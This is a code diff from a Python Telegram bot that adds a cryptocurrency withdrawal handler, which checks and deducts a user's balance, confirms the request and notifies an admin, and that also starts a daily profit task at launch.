+            amount = float(lines[1])
+            address = lines[2]
+
+            db_user = get_or_create_user(user_id)
+
+            if amount > db_user[1]:
+                await message.answer("❌ Insufficient balance. You don't have enough funds for this withdrawal.")
+                del user_state[user_id]
+                return
+
+            deduct_balance(user_id, amount)
+
+            text = (
+                "📤 <b>Withdraw Request Received</b>\n\n"
+                f"🪙 Crypto: {crypto}\n"
+                f"💰 Amount: ${amount:,.2f}\n"
+                f"📍 Address: <code>{address}</code>\n\n"
+                "✅ Your request is under review by our team.\n"
+                "⏳ It will be processed within 12 hours maximum.\n\n"
+                "You will receive a notification when the funds are sent."
+            )
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="← Back to Main Menu", callback_data="back_main")]
+            ])
+            await message.answer(text, reply_markup=kb, parse_mode="HTML")
+
+            try:
+                new_balance = db_user[1] - amount
+                await bot.send_message(
+                    ADMIN_ID,
+                    f"📤 New Withdraw Request!\n\n"
+                    f"👤 Name: {user.full_name}\n"
+                    f"🆔 ID: {user_id}\n"
+                    f"🔗 Username: @{user.username if user.username else 'none'}\n\n"
+                    f"🪙 Crypto: {crypto}\n"
+                    f"💰 Amount: ${amount}\n"
+                    f"📍 Address: {address}\n"
+                    f"New Balance: ${new_balance:.2f}"
+                )
+            except:
+                pass
+
+            del user_state[user_id]
+        except:
+            await message.answer(
+                "❌ Wrong format. Please send exactly three lines:\n\n"
+                "Crypto\nAmount\nAddress\n\n"
+                "Example:\nUSDT\n250\nTMaWMMVPSrNRUp6hnkr1mSQAQ6XVtn8TFL"
+            )
+        return
+
     if user_id not in user_state:
         return
     try:
@@ -635,10 +915,11 @@ async def handle_amount(message: types.Message):
         await loading.delete()
         del user_state[user_id]
     except:
-        await message.answer("❌ Unesi samo broj (npr. 750)")
+        await message.answer("❌ Please enter only a number (e.g. 750)")
 
 async def main():
-    print("✅ Bot je spreman sa promo porukama!")
+    print("✅ Bot je spreman!")
+    asyncio.create_task(daily_profit_task())
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
